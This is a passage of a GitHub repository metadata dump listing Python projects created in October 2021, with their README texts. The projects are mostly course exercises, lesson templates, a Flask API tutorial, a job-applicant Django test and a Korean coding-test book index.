setup.cfg. You can find details about the fields in the PyPa packaging tutorial. You may leave the version as it is. It is set automatically by package.py. Rename src/pythontemplate to whatever you like. The name determines how to import the package in a python script. You should therefore omit spaces, underscores, and dashes. You can add as many of these top-level folders as you like.  Commands You can access the help of package.py by running: python package.py --help As explained above, you can build your wheel files and get a detailed report about your code by running: python package.py build If you only want the detailed report, just run: python package.py report If you want to generate just the documentation and not get any report, use: python package.py doc If you want to remove the wheel files, documentation, and report: python package.py remove License The package is distributed under Apache License 2.0. You can use it for anything you want! Attribution would be nice, but you do not have to.  ;) "
417569885;Python-Code-Samples;https://github.com/larrylakeisha/Python-Code-Samples;Python;2021-10-15T16:40:24Z;0;0;0;Python-Code-Samples Here are my python code samples. This respository contains six python files. 
417572771;AnalyticsUsingPython;https://github.com/sagardatta123/AnalyticsUsingPython;HTML;2021-10-15T16:51:02Z;0;0;0;
417662227;python-practicals-2;https://github.com/aichadiop2021/python-practicals-2;;2021-10-15T23:21:32Z;0;0;0;
417596514;Advanced_python_course;https://github.com/Szpila123/Advanced_python_course;Python;2021-10-15T18:21:12Z;0;0;0;Advanced_python_course Tasks solved during Advanced python course of University of Wroclaw, Institute of Computer Science 
417606702;DataScience-Python;https://github.com/taehyun53/DataScience-Python;Jupyter Notebook;2021-10-15T19:02:20Z;0;0;0;DataScience-Python NewYorkCity DataScience Academy 
417576949;57-programmers-challenge-python;https://github.com/Selasi3/57-programmers-challenge-python;Python;2021-10-15T17:05:50Z;0;0;0;57-programmers-challenge-python Solving program challenges using python 
417624155;Data-Analysis-with-Python;https://github.com/carlintchuisseu/Data-Analysis-with-Python;Jupyter Notebook;2021-10-15T20:17:37Z;0;0;0;Data-Analysis-with-Python This repo contains hands on for the course Data Analysis with Python from the IBM data science professional certificate on IBM 
417652523;CursoEmVideoPython;https://github.com/gabriel-valenga/CursoEmVideoPython;Python;2021-10-15T22:22:42Z;0;0;0;
417660151;Pythone-Clicker-Game;https://github.com/CaidnAnimates/Pythone-Clicker-Game;Python;2021-10-15T23:08:16Z;0;0;0;
417652826;atbs-learning-python;https://github.com/dennymin/atbs-learning-python;Python;2021-10-15T22:24:19Z;0;0;0;atbs-learning-python I am trying to learn python using this website: https://automatetheboringstuff.com/ 
417649840;Keylogger-using-python;https://github.com/AdamyJain/Keylogger-using-python;;2021-10-15T22:09:23Z;0;0;0;
417588697;python_Assignment_1;https://github.com/AsoUrum/python_Assignment_1;Python;2021-10-15T17:51:10Z;0;0;0;
417612098;python-random-quote;https://github.com/dbreeding/python-random-quote;Python;2021-10-15T19:24:26Z;0;0;0;Let's Write a Python Quote Bot! This repository will get you started with building a quote bot in Python. It's meant to be used along with the Learning Lab intro to Python. When complete, you'll be able to grab random quotes from the command line, like this:  $ python get-quote.py Keep it logically awesome $ python get-quote.py Speak like a human  Start the Tutorial You can find your next step in this repo's issues! 
417644979;machine-learning-neural-python;https://github.com/tompollard/machine-learning-neural-python;Python;2021-10-15T21:46:21Z;0;0;0;FIXME Lesson title  Thanks for contributing to The Carpentries Incubator! This repository provides a blank starting point for lessons to be developed here. A member of the Carpentries Curriculum Team will work with you to get your lesson listed on the Community Developed Lessons page and make sure you have everything you need to begin developing your new lesson. What to do next Before you begin developing your new lesson, here are a few things we recommend you do:   Decide on a title for your new lesson! Once you've chosen a new title, you can set the value for lesson_title in _config.yml  Add the URL to your built lesson pages to the repository description*  Add relevant topic tags to your lesson repository.  Fill in the fields marked FIXME in:  this README _config.yml    If you're going to be developing lesson material for the first time according to our design principles, consider reading the Carpentries Curriculum Development Handbook  Consult the Lesson Example website to find out more about working with the lesson template  If you are planning to write your lesson in RMarkdown, create a main branch and set this as the default branch in your repository settings  Update this README with relevant information about your lesson and delete this section  * To set the URL on GitHub, click the gear wheel button next to About on the right of the repository landing page. The lesson URL structure is https://carpentries-incubator.github.io/<repository-slug>: a repository at https://github.com/carpentries-incubator/new-lesson/ will have pages at the lesson URL https://carpentries-incubator.github.io/new-lesson/. Contributing We welcome all contributions to improve the lesson! Maintainers will do their best to help you if you have any questions, concerns, or experience any difficulties along the way. We'd like to ask you to familiarize yourself with our Contribution Guide and have a look at the more detailed guidelines on proper formatting, ways to render the lesson locally, and even how to write new episodes. Please see the current list of [issues][FIXME] for ideas for contributing to this repository. For making your contribution, we use the GitHub flow, which is nicely explained in the chapter Contributing to a Project in Pro Git by Scott Chacon. Look for the tag . This indicates that the maintainers will welcome a pull request fixing this issue. Maintainer(s) Current maintainers of this lesson are  FIXME FIXME FIXME  Authors A list of contributors to the lesson can be found in AUTHORS Citation To cite this lesson, please consult with CITATION 
417614393;python-ui-automation-unitttest;https://github.com/lucho746/python-ui-automation-unitttest;Python;2021-10-15T19:34:06Z;0;0;0;"""# python-ui-automation-unitttest"" "
417587433;KNN-model-in-python;https://github.com/JoeEbbyKaruthedath/KNN-model-in-python;Jupyter Notebook;2021-10-15T17:46:14Z;0;0;0;
417668992;Estrutura-de-Dados-Python;https://github.com/EubensSouza/Estrutura-de-Dados-Python;Python;2021-10-16T00:00:45Z;0;0;0;
417566764;python-selenium-demo;https://github.com/jjvsevilla/python-selenium-demo;Python;2021-10-15T16:28:41Z;0;0;0;python-selenium-demo Base project for testing selenium v4.0.0 Project dependencies: Python 3.9.7 Selenium 4.0.0 Chrome driver 94.0.4606.61 
417615676;python-tkinter-crud-facil;https://github.com/JeanBayer/python-tkinter-crud-facil;Python;2021-10-15T19:39:49Z;0;0;0;
417578178;Fundamentos-ETL-com-python;https://github.com/Wilsonmfreire/Fundamentos-ETL-com-python;Jupyter Notebook;2021-10-15T17:10:42Z;0;0;0;Fundamentos-ETL-com-python Familiarizando com os processos de ETL usando o Python. Utilizando Jupyter e frameworks Panda e Pandera. 
417572915;python-random-quote;https://github.com/BigIvan478/python-random-quote;Python;2021-10-15T16:51:32Z;0;0;0;Let's Write a Python Quote Bot! This repository will get you started with building a quote bot in Python. It's meant to be used along with the Learning Lab intro to Python. When complete, you'll be able to grab random quotes from the command line, like this:  $ python get-quote.py Keep it logically awesome $ python get-quote.py Speak like a human  Start the Tutorial You can find your next step in this repo's issues! 
417624212;python_sql_connection;https://github.com/wangsongyuan98/python_sql_connection;Jupyter Notebook;2021-10-15T20:17:55Z;0;0;0;python_sql_connection 
417603167;python-brasil-talk-2021;https://github.com/ffmmjj/python-brasil-talk-2021;Jupyter Notebook;2021-10-15T18:47:35Z;0;0;0;
417584624;Project-3---Python---Wrestling;https://github.com/nikhilkalhan92/Project-3---Python---Wrestling;HTML;2021-10-15T17:35:21Z;0;0;0; Welcome nikhilkalhan92, This is the Code Institute student template for deploying your third portfolio project, the Python command-line project. The last update to this file was: August 17, 2021 Reminders  Your code must be placed in the run.py file Your dependencies must be placed in the requirements.txt file Do not edit any of the other files or your code may not deploy properly  Creating the Heroku app When you create the app, you will need to add two buildpacks from the Settings tab. The ordering is as follows:  heroku/python heroku/nodejs  You must then create a Config Var called PORT. Set this to 8000 If you have credentials, such as in the Love Sandwiches project, you must create another Config Var called CREDS and paste the JSON into the value field. Connect your GitHub repository and deploy as normal. Constraints The deployment terminal is set to 80 columns by 24 rows. That means that each line of text needs to be 80 characters or less otherwise it will be wrapped onto a second line.  Happy coding! 
417563094;Hillel_python_advance;https://github.com/Faotik/Hillel_python_advance;;2021-10-15T16:15:40Z;0;0;0;Hillel_python_advance 
417592429;formacao-python-alura;https://github.com/dmorais8/formacao-python-alura;Python;2021-10-15T18:05:16Z;0;0;0;
417646763;python-api-books;https://github.com/harlericho/python-api-books;Python;2021-10-15T21:55:55Z;0;0;0;python-api-books Creación de api restful de registro de unos libros, usando SQLite3 y Python 
417591762;Python_Innovaccion_Virtal;https://github.com/JesusCG2021/Python_Innovaccion_Virtal;;2021-10-15T18:02:43Z;0;0;0;
417622394;Python-Image-Stitching;https://github.com/kostovaelena/Python-Image-Stitching;Python;2021-10-15T20:09:31Z;0;0;0;"Image Stitching in Python Setup  Install Python 3.7.6 Install PyCharm In Command Prompt type:  python -m pip install numpy python -m pip install opencv-python pip install matplotlib pip install opencv-contrib-python==3.4.2.16 pip install imutils  Open the file ""image_stitching.py"" in PyCharm   Open Command Prompt and go to the folder where the project is saved, using ""cd"" Type:  python image_stitching.py  Open the file ""image_stitching_multiple_pics.py"" in PyCharm   Open Command Prompt and go to the folder where the project is saved, using ""cd"" Type:  python image_stitching_multiple_pics.py --images images --output image_output.jpg ""--images images"" means that all images will be taken from the folder named ""images"" ""--output image_output.jpg"" means that the resulting stitched image will be written in ""image_output.jpg"" format "
417623630;python-wifi-scanner;https://github.com/A-Mackey/python-wifi-scanner;;2021-10-15T20:15:20Z;0;0;0;python-wifi-scanner 
417628274;Python-Pandas-Exercises;https://github.com/Enrique-Alvaro/Python-Pandas-Exercises;;2021-10-15T20:37:16Z;0;0;0;Python-Pandas-Exercises Pandas is a fast, powerful, flexible and easy to use open source data analysis and manipulation tool, built on top of the Python programming language. 
417617755;Python-GUI-App;https://github.com/antarpreet11/Python-GUI-App;Python;2021-10-15T19:49:26Z;0;0;0;App Launcher This app allows the user to run as many system apps as they want from a single click The user can save these preferences and run them whenever they want without having to select the apps again A Graphical User Interface is provided for the user to be able to select and run the apps  This is what the simple Tkinter GUI looks like:  
417622346;work-time-watcher-python;https://github.com/Maflex24/work-time-watcher-python;Python;2021-10-15T20:09:19Z;0;0;0;work-time-watcher-python 
417571172;CursoGraficasPython;https://github.com/EdgarMoyete/CursoGraficasPython;Jupyter Notebook;2021-10-15T16:45:01Z;0;0;0;Curso de Graficas con Python Matplotlib Seaborn Canal de Youtube https://www.youtube.com/channel/UCTpcZMHrqzBSrPa9bEbANDw 
417641869;Python-Mini-Projects;https://github.com/Mahmoud-El-Gohary/Python-Mini-Projects;Python;2021-10-15T21:30:39Z;0;0;0;
417613434;Learning-Python-CeV;https://github.com/marlonalmino/Learning-Python-CeV;Python;2021-10-15T19:30:07Z;0;0;0;
417617238;CalculatorUsingPython;https://github.com/KanakPitalia/CalculatorUsingPython;Python;2021-10-15T19:47:01Z;0;0;0;
417631195;Python_MySql;https://github.com/MOHAMMAD-FATHA/Python_MySql;Python;2021-10-15T20:47:38Z;0;0;0;
417655071;python-causality-handbook;https://github.com/youngminju-phd/python-causality-handbook;Jupyter Notebook;2021-10-15T22:36:53Z;0;0;0;
417655378;socketUDP-python;https://github.com/sferriss/socketUDP-python;Python;2021-10-15T22:38:51Z;0;0;0;socketUDP-python Trabalho para disciplina de redes I usando socket udp. O objetivo do trabalho é fazer um sistema de compartilhamento de arquivos via rede. 
417611710;piot-python-components;https://github.com/NULishengZhang/piot-python-components;Python;2021-10-15T19:22:51Z;0;0;0;"Programming the IoT - Python Components This is the source repository for the Python components related to my Programming the Internet of Things book and Connected Devices IoT course. These are shell wrappers ONLY and are not a solution set (which is a separately repository, not yet released). For convenience to the reader, some basic functionality has already been implemented (such as configuration logic, consts, interfaces, and test cases). The code in this repository is largely comprised of shell classes that are designed to be implemented by the reader and are NOT solutions. These shell classes and their relationships respresent a notional design that aligns with the requirements listed in Programming the IoT Requirements. These requirements encapsulate the programming exercises presented in my book Programming the Internet of Things: An Introduction to Building Integrated, Device to Cloud IoT Solutions. How to use this repository If you're reading Programming the Internet of Things: An Introduction to Building Integrated, Device to Cloud IoT Solutions, you'll see a tie-in with the exercises described in each chapter and this repository. Most of the code in the main src tree is NOT implemented by design. It's intended for you - as the reader of my book (and possibly a student in one of my IoT courses) - to implement by filling in the implementation details as you work through each exercise. A solution set is available, although I haven't yet released it. Stay tuned for updates on this topic. This repository aligns to exercises in Programming the Internet of Things These components are all written in Python3, and correlate to the exercises designed for the Constrained Device Application (CDA) specified in my book Programming the Internet of Things: An Introduction to Building Integrated, Device to Cloud IoT Solutions. Since Python is also used for various cloud computing activities, there are other components that may be introduced as Cloud Service Functions (CSF) in the future, as they will share some of the common data management code written for the CDA exercises. How to navigate the directory structure for this repository This repository is comprised of the following top level paths:  config: Contains basic configuration file(s). src: Contains the following source trees:  src/main/python: The main source tree for python-components. Keep in mind that most of these classes are shell representations ONLY and must be implemented as part of the exercises referenced above. src/test/python: The test source tree for python-components. These are designed to perform very basic unit and integration testing of the implementation of the exercises referenced above. This tree is sectioned by part - part01, part02, and part03 - which correspond to the structure of Programming the Internet of Things.    Here are some other files at the top level that are important to review:  basic_imports.txt: The core library dependencies - use pip to install. cv_imports.txt: The optional CV library dependencies - STILL BEING TESTED - use pip to install. README.md: This README. LICENSE: The repository's LICENSE file.  Lastly, here are some 'dot' ('.{filename}') files pertaining to dev environment setup that you may find useful (or not - if so, just delete them after cloning the repo):  .gitignore: The obligatory .gitignore that you should probably keep in place, with any additions that are relevant for your own cloned instance. .project: The Eclipse IDE project configuration file that may / may not be useful for your own cloned instance. Note that using this file to help create your Eclipse IDE project will result in the project name 'piot-python-components' (which can be changed, of course). .pydevproject: The Eclipse IDE and PyDev-specific configuration file for your Python environment that may / may not be useful for your own cloned instance.  NOTE: The directory structure and all files are subject to change based on feedback I receive from readers of my book and students in my IoT class, as well as improvements I find to be helpful for overall repo betterment. Other things to know Pull requests PR's are disabled while the codebase is being developed. Updates Much of this repository, and in particular unit and integration tests, will continue to evolve, so please check back regularly for potential updates. REFERENCES This repository has external dependencies on other open source projects. I'm grateful to the open source community and authors / maintainers of the following libraries: Core exercises:  aiocoap  Reference: Amsüss, Christian and Wasilak, Maciej. aiocoap: Python CoAP Library. Energy Harvesting Solutions, 2013–. http://github.com/chrysn/aiocoap/.   apscheduler  Reference: A. Grönholm. APScheduler. (2020) [Online]. Available: https://pypi.org/project/APScheduler/.   psutil  Reference: G. Rodola. Psutil. (2009 – 2020) [Online]. Available: https://psutil.readthedocs.io/en/latest/.   numpy  Reference: NumPy. NumPy. (2020) [Online]. Available: https://numpy.org/.   matplotlib  Reference: J. D. Hunter, ""Matplotlib: A 2D Graphics Environment"", Computing in Science & Engineering, vol. 9, no. 3, pp. 90-95, 2007. DOI: https://doi.org/10.5281/zenodo.592536   Sense-Emu  Reference: The Raspberry Pi Foundation. Sense HAT Emulator. (2016) [Online]. Available: https://sense-emu.readthedocs.io/en/v1.0/.   pisense  Reference: D. Jones. Pisense. (2016 – 2018) [Online]. Available: https://pisense.readthedocs.io/en/release-0.2/.   paho-mqtt  Reference: Eclipse Foundation, Inc. Eclipse Paho™ MQTT Python Client. (2020) [Online]. Available: https://github.com/eclipse/paho.mqtt.python.   CoAPthon  Reference: G.Tanganelli, C. Vallati, E.Mingozzi, ""CoAPthon: Easy Development of CoAP-based IoT Applications with Python"", IEEE World Forum on Internet of Things (WF-IoT 2015)    Additional exercises:  imutils  Reference: A. Rosebrock. imutils. (2020) [Online]. Available: https://pypi.org/project/imutils/.   opencv-python  Reference: O. Heinisuo. opencv-python. (2020) [Online]. Available: https://pypi.org/project/opencv-python/.   opencv-python-headless  Reference: See opencv-python   opencv-contrib-python  Reference: See opencv-python   rtsp  Reference: M. Stewart. rtsp. (2020) [Online]. https://pypi.org/project/rtsp/.    NOTE: This list will be updated as others are incorporated. FAQ For typical questions (and answers) to the repositories of the Programming the IoT project, please see the FAQ. IMPORTANT NOTES This code base is under active development. If any code samples or other technology this work contains, describes, and / or is subject to open source licenses or the intellectual property rights of others, it is your responsibility to ensure that your use thereof complies with such licenses and/or rights. LICENSE Please see LICENSE if you plan to use this code. "
417562722;python-random-quote;https://github.com/ellaisr/python-random-quote;Python;2021-10-15T16:14:30Z;0;0;0;Let's Write a Python Quote Bot! This repository will get you started with building a quote bot in Python. It's meant to be used along with the Learning Lab intro to Python. When complete, you'll be able to grab random quotes from the command line, like this:  $ python get-quote.py Keep it logically awesome $ python get-quote.py Speak like a human  Start the Tutorial You can find your next step in this repo's issues! 
417589015;python_os_gnu-linux;https://github.com/suddenAppearance/python_os_gnu-linux;Python;2021-10-15T17:52:25Z;0;0;0;
417585969;python_basics_1;https://github.com/edgarmontes/python_basics_1;Python;2021-10-15T17:40:29Z;0;0;0;python_basics_1 
417627447;Python-PySpark-Exercises;https://github.com/Enrique-Alvaro/Python-PySpark-Exercises;;2021-10-15T20:33:19Z;0;0;0;Python-PySpark-Exercises PySpark is an interface for Apache Spark in Python. It not only allows you to write Spark applications using Python APIs, but also provides the PySpark shell for interactively analyzing your data in a distributed environment. PySpark supports most of Spark’s features such as Spark SQL, DataFrame, Streaming, MLlib (Machine Learning) and Spark Core. 
417619013;Python-website-blocker;https://github.com/Marc-AntoineGuay/Python-website-blocker;Python;2021-10-15T19:54:54Z;0;0;0;
417629027;teste-backend-python;https://github.com/ies2-dev/teste-backend-python;;2021-10-15T20:39:47Z;0;0;0;"IES2 - Inovação e Tecnologia Este é um teste de Desenvolvedor Python como pré-entrevista para a candidatura à posição de Desenvolvedor Python  Por gentileza, para executar este teste, faça um fork deste repositório em sua conta. caso você não tenha uma conta do GitHub, você pode fazer uma clicando neste link. Desafios  Prover uma API Restful em Django para um cliente enviar dados à um servidor. Esta API deve possuir seu próprio README.md. os endpoints devem ser documentados com Api Blueprint A Api deve aceitar os formatos de entrada de dados via JSON, e o retorno poder ser tanto em JSON quanto em XML Deve haver um tratamento de datas para que as mesmas possam ser armazenadas de forma consistente à um banco  de dados (qualquer um à sua escolha) A api prover uma forma consistente de o cliente poder fazer uma alteração no modo em que a data é retornada para ele, como por exemplo: o cliente poder escolher se ele vai receber o dado de retorno das datas em ISO Dateou timestamp.  Requisitos 1. URLs  endpoint que irá receber os dados => POST -- /data endpoint que irá retornar todos os dados => GET -- /data endpoint que irá retornar os dados de um usuário => GET -- /data/<id>  2. Request data format { 	""name"" : ""John Doe"", 	""skills"": [ 		""Django"", 		""Python"", 		""Flask"", 		""Celery"", 		""DevOps"", 		""MongoDB"", 		""PyTest"", 		""Clean Code"" 	], 	""birthdate"": ""26/11/1993"" } 3. Um dos formatos de retorno possíveis deve ser : [     { 	    ""id"": 1, 		""name"" : ""Jane Doe"", 		""skills"": [ 			""Django"",""Flask"", ""Celery"" 		], 		""birthdate"": 1993-11-26T19:00:00+00:00 	} ] Recomendações Aqui estão algumas instruções que podem lhe auxiliar na hora de tomar suas decisões na hora de desenvolver. Tecnologias  para este desafio   Django - Framework à ser utilizado   Django REST framework - biblioteca de abstração Restful   PyTest - Ferramentas de testes do Python   O que será observado  Tomadas de decisões ao longo do desenvolvimento Modo como será utilizado o git O domínio sobre a linguagem ao resolver problemas de formas simples e elegantes utilizando as ferramentas disponíveis Capacidade de abstração Organização Conhecimentos sobre Django PEP-8 Teste unitários Clean Code DevOps  Autor  Bovenzo  - GitHub  "
417655569;BasicPythonCourse;https://github.com/Janjo25/BasicPythonCourse;Python;2021-10-15T22:40:06Z;0;0;0;
417644514;machine-learning-responsible-python;https://github.com/tompollard/machine-learning-responsible-python;Python;2021-10-15T21:44:03Z;0;0;0;FIXME Lesson title  Thanks for contributing to The Carpentries Incubator! This repository provides a blank starting point for lessons to be developed here. A member of the Carpentries Curriculum Team will work with you to get your lesson listed on the Community Developed Lessons page and make sure you have everything you need to begin developing your new lesson. What to do next Before you begin developing your new lesson, here are a few things we recommend you do:   Decide on a title for your new lesson! Once you've chosen a new title, you can set the value for lesson_title in _config.yml  Add the URL to your built lesson pages to the repository description*  Add relevant topic tags to your lesson repository.  Fill in the fields marked FIXME in:  this README _config.yml    If you're going to be developing lesson material for the first time according to our design principles, consider reading the Carpentries Curriculum Development Handbook  Consult the Lesson Example website to find out more about working with the lesson template  If you are planning to write your lesson in RMarkdown, create a main branch and set this as the default branch in your repository settings  Update this README with relevant information about your lesson and delete this section  * To set the URL on GitHub, click the gear wheel button next to About on the right of the repository landing page. The lesson URL structure is https://carpentries-incubator.github.io/<repository-slug>: a repository at https://github.com/carpentries-incubator/new-lesson/ will have pages at the lesson URL https://carpentries-incubator.github.io/new-lesson/. Contributing We welcome all contributions to improve the lesson! Maintainers will do their best to help you if you have any questions, concerns, or experience any difficulties along the way. We'd like to ask you to familiarize yourself with our Contribution Guide and have a look at the more detailed guidelines on proper formatting, ways to render the lesson locally, and even how to write new episodes. Please see the current list of [issues][FIXME] for ideas for contributing to this repository. For making your contribution, we use the GitHub flow, which is nicely explained in the chapter Contributing to a Project in Pro Git by Scott Chacon. Look for the tag . This indicates that the maintainers will welcome a pull request fixing this issue. Maintainer(s) Current maintainers of this lesson are  FIXME FIXME FIXME  Authors A list of contributors to the lesson can be found in AUTHORS Citation To cite this lesson, please consult with CITATION 
417635518;python-desktop-assistant;https://github.com/dallas-hyde/python-desktop-assistant;Python;2021-10-15T21:04:13Z;0;0;0;python-desktop-assistant What is this? This is a personal desktop assistant written in Python and Tkinter. How does it work?  Download the repo and copy the default configuration files that end in .json. Rename the copied files to clock.json and weather.json. You can then edit the configuration of the clock and weather widgets through their configuration files. You should get an OpenWeatherMap account setup and put your API key, zip code and country abbreviation in the corresponding fields inside of your weather.json. You then install the required pip packages using the requirements.txt file. Then you run python ./src/main.py.  You can close the application by right clicking on any of the text and the window bar will appear, you can then close the application. NOTE: This can sometimes be a bit finicky, just keep trying or you can kill the program from your process list. LINUX / MAC IMPORTANT Linux: Linux tkinter does not support completely transparent backgrounds so the app will have a semi transparent grey background. Linux also has issues displaying emoji, so in the weatherTypes field inside of weather.json you can put text or other symbols to represent the weather types. Mac: I can't test Mac compatability because I don't own a Mac. If there are any issues on Mac, feel free to let me know and I'll try my best to fix them. 
417661535;Data-science-using-python;https://github.com/Okeola/Data-science-using-python;Python;2021-10-15T23:17:09Z;0;0;0;" Note: Please fork the current Udacity repository so that you will have a remote repository in your Github account. Clone the remote repository to your local machine. Later, as a part of the project ""Post your Work on Github"", you will push your proposed changes to the remote repository in your Github account.  Date created. This is important for reference Include the date you created this project and README file. Use yy/mm/dd format Project Title Replace the Project Title. Make it as explanatory as possible Description and information Describe what your project is about and what it does. Explain the information in the details Files used. What type of files was used. State the format Include the files used Credits It's important to give proper credit. Add links to any repo that inspired you or blogposts you consulted. Thanks to Dr. Google "
417579488;Python-machine-learning;https://github.com/abhishekMuge/Python-machine-learning;;2021-10-15T17:15:33Z;0;0;0;
417615684;small_python_projects;https://github.com/memcmahon/small_python_projects;Python;2021-10-15T19:39:51Z;0;0;0;
417605889;math-linear-algebra-python;https://github.com/psilons/math-linear-algebra-python;;2021-10-15T18:59:29Z;0;0;0;math-linear-algebra-python 
417589493;Web-Scraping-with-Python;https://github.com/joekakone/Web-Scraping-with-Python;Python;2021-10-15T17:54:13Z;0;0;0;Web Scraping with Python - Requests - BeautifulSoup - Selenium - Pandas Hello, I'm Joseph Konka, Python enthousiast. In this porject, I'm doing web scraping tasks. I hope it will help you to understand the subject. Bye ! 
417597658;Python-Functions-Basics;https://github.com/KreativeKaruna/Python-Functions-Basics;Jupyter Notebook;2021-10-15T18:25:41Z;0;0;0;
417625649;100-Days-of-Python;https://github.com/Ramyhemdan2018/100-Days-of-Python;Python;2021-10-15T20:24:53Z;0;0;0;100-Days-of-Python 100 Days of Python With Projects 
417561170;Python-for-Data-Science;https://github.com/datasabo/Python-for-Data-Science;Jupyter Notebook;2021-10-15T16:08:57Z;0;0;0;
417660036;DataStructures_Python;https://github.com/laotraescuelita/DataStructures_Python;Python;2021-10-15T23:07:29Z;0;0;0;DataStructures_Python Algunas estructuras de datos como stacks, queue, link list, binary trees, etc... La finalidad es aprender como funcionan algunas estructuras de datos y su implementacion en Python. Con el tiemp espero ser yo quien los relice de manera ma robusta y/o con ayuda de alguien mas. Espero que les sea de utilidad y que ayuden a quien deban de ayudar. 
417653814;Curso-Basico-Python;https://github.com/UlisesAlexanderAM/Curso-Basico-Python;Python;2021-10-15T22:29:43Z;0;0;0;
417562184;python-random-quote;https://github.com/gokulraja/python-random-quote;Python;2021-10-15T16:12:44Z;0;0;0;Let's Write a Python Quote Bot! This repository will get you started with building a quote bot in Python. It's meant to be used along with the Learning Lab intro to Python. When complete, you'll be able to grab random quotes from the command line, like this:  $ python get-quote.py Keep it logically awesome $ python get-quote.py Speak like a human  Start the Tutorial You can find your next step in this repo's issues! 
417667618;Python-flusk-API-Tutorial;https://github.com/flopezcardozo/Python-flusk-API-Tutorial;Python;2021-10-15T23:51:58Z;0;0;0;"Todo List API in Python Flask  This is an interactive tutorial that will teach you how to create an API using the Python Flask framework using Python and Pipenv. 🌱  How to start this project This project comes with the necessary files to start working, but you have two options to start: a) Open this link in your browser to clone it with gitpod: https://gitpod.io#https://github.com/breatheco-de/python-flask-api-tutorial b) You can clone this repository on your local computer: $ git clone https://github.com/breatheco-de/python-flask-api-tutorial 💡 Important: Remember to create a new repository, update the remote (git remote set-url origin <your new url>), and upload the code to your new repository using add, commit and push. About the project we are going to build In this tutorial we are going to be building a REST API that exposes 3 endpoints to the internet: GET /todos POST /todos DELETE /todos/<int:position>  GET /todos Will return the list of all todos like this: [     {         ""done"": true,         ""label"": ""Sample Todo 1""     },     {         ""done"": true,         ""label"": ""Sample Todo 2""     } ] POST /todos It's going to add a new todo to the list, it will receive the following request body: {     ""done"": true,     ""label"": ""Sample Todo 1"" } And return the updated list of todos DELETE /todos/int:position It's going to remove one todo based on a given position at the end of the url, and return the updated list of todos. "
417609627;TestingFramework_Python;https://github.com/mamatan/TestingFramework_Python;Python;2021-10-15T19:13:51Z;0;0;0;TestingFramework_Python 
417662510;python_selenium_bdd;https://github.com/jaramosperez/python_selenium_bdd;;2021-10-15T23:23:21Z;0;0;0;Python Selenium BDD Proyecto Base para Automatización con Python 
417654954;python-for-coding-test;https://github.com/youngminju-phd/python-for-coding-test;Python;2021-10-15T22:36:12Z;0;0;0;이것이 취업을 위한 코딩 테스트다 with Python  취업과 이직을 결정하는 알고리즘 인터뷰 완벽 가이드 (2020년 08월 05일 정식 출시)   이 저장소는 이것이 취업을 위한 코딩 테스트다 with Python (나동빈 저, 한빛미디어) 전체 소스코드를 포함합니다. 본 책은 Python 3.7 문법을 활용하였으나, 추가적으로 Java, C++11 소스코드를 제공합니다. 책 내용 및 소스코드와 관련한 궁금한 점은 Issues 탭을 이용하여 남겨주세요. 책의 오류 사항을 발견하시면 dongbinna@postech.ac.kr로 보내주시면 감사하겠습니다.  이 경우, 원하신다면 정오표에 독자님의 이름(혹은 아이디)을 함께 기재해드립니다.   이 책을 이용해 강의를 진행하시는 교수/선생님/강사/동아리장 님들을 위해 강의용 PPT를 제공합니다. (준비중) 전체 동영상 강의는 2020년 8 ~ 9월에 걸친 유튜브 라이브 강의를 진행하고 편집 후에 업로드 될 예정입니다. 책 구매 링크: 한빛미디어 / YES24 / 교보문고 / 알라딘   대기업 코딩 테스트 문제 적중 관련   최근 2021 K사 공채 코딩 테스트 1차 합격 커트라인은 3문제 ~ 3.5문제(부분점수 포함)로 예상됩니다.   저자 또한 코딩 테스트에 참여해 보았고, 파이썬만 이용하여 알고리즘 코딩 테스트에 합격할 수 있었습니다.   특히 아래 두 문제는 본 책의 파이썬 코드를 참고하여 쉽게 해결할 수 있었습니다.   3번 문제 (이진 탐색): 책의 15장 정렬된 배열에서 특정 수의 개수 구하기 알고리즘을 활용하면 쉽게 풀 수 있는 문제였습니다.  파이썬의 bisect_left 함수를 활용합니다.    4번 (플로이드 워셜): 책의 9장 미래 도시 문제와 접근 방법 및 아이디어가 사실상 동일한 문제입니다.  특정한 중간 지점을 거쳐 갈 때의 최단 경로 알고리즘으로 볼 수 있습니다. 저자 개인적으로도 이 문제는 보자마자 풀어서 7분 이내로 풀 수 있었습니다.     도와주신 분들  베타 리뷰어 님들: 김민철, 안수빈, 정한길, 황성호 외 10분 백준 온라인 저지(BOJ)의 일부 문제를 사용할 수 있도록 허락해주고, 개인적으로 많은 도움을 주신 최백준 님 2019, 2020 K사 문제를 책에 수록할 수 있도록 허락해주신 (주)그렙 프로그래머스  PPL: 프로그래머스 알고리즘 문제 풀이 강의    시작하며  지은이의 글 및 리뷰어의 글  Part 1 코딩 테스트, 무엇을 어떻게 준비할까? 1장 코딩 테스트 개요  코딩 테스트 개념과 배경 실습 환경 구축하기 복잡도  파이썬 수행 시간 측정 방법 선택 정렬과 기본 정렬 라이브러리의 수행 시간 비교    2장 16~20년 코딩 테스트 기출문제 유형 분석  최신 출제 경향과 준비 방향 연도별 코딩 테스트 유형 분석  GUIDE: 성공적인 취업을 위한 가이드  채용 프로세스 기술 면접의 대표적인 유형 기술 면접 준비 알고리즘 문제 풀이 사이트 커뮤니티 사이트  Part 2 주요 알고리즘 이론과 실전 문제 3장 그리디  이론  당장 좋은 것만 선택하는 그리디 거스름돈 문제: (Python 3.7 코드 / C++ 코드 / Java 코드)   실전  동빈이의 큰 수의 법칙: (Python 3.7 코드 / C++ 코드 / Java 코드) 숫자 카드게임: (Python 3.7 코드 / C++ 코드 / Java 코드) 1이 될 때까지: (Python 3.7 코드 / C++ 코드 / Java 코드)    4장 구현  이론  아이디어를 코드로 바꾸는 구현 상하좌우: (Python 3.7 코드 / C++ 코드 / Java 코드) 시각: (Python 3.7 코드 / C++ 코드 / Java 코드)   실전  왕실의 나이트: (Python 3.7 코드 / C++ 코드 / Java 코드) 게임 개발: (Python 3.7 코드 / C++ 코드 / Java 코드)    5장 DFS/BFS  이론  꼭 필요한 자료구조 기초 탐색 알고리즘 DFS/BFS 스택 구현 예제: (Python 3.7 코드 / C++ 코드 / Java 코드) 큐 구현 예제: (Python 3.7 코드 / C++ 코드 / Java 코드) 무한히 반복되는 재귀함수 예제: (Python 3.7 코드 / C++ 코드 / Java 코드) 재귀함수의 종료 조건 예제: (Python 3.7 코드 / C++ 코드 / Java 코드) 2가지 방식으로 구현한 팩토리얼 예제: (Python 3.7 코드 / C++ 코드 / Java 코드) 인접 행렬 예제: (Python 3.7 코드 / C++ 코드 / Java 코드) 인접 리스트 예제: (Python 3.7 코드 / C++ 코드 / Java 코드) DFS: (Python 3.7 코드 / C++ 코드 / Java 코드) BFS: (Python 